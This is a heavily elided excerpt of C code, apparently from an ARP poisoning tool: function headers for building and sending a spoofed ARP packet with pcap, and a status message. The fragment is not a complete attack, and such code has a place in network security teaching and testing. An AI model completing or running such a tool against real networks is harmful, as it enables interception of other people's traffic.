...
static void send_arp_poison(pcap_t *handle, u_char *source_ip, u_char *target_ip, u_char *source_mac, u_char *target_mac, bool verbose)
{
    u_char      packet[42];
    arphdr_t    *arpheader;
    ...
    memcpy(arpheader->tpa, target_ip, IP_ADDR_LEN);
...
static void	check_and_start(pcap_t *handle, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
{
    ...
    {
		printf("Sending ARP poison packet\n");
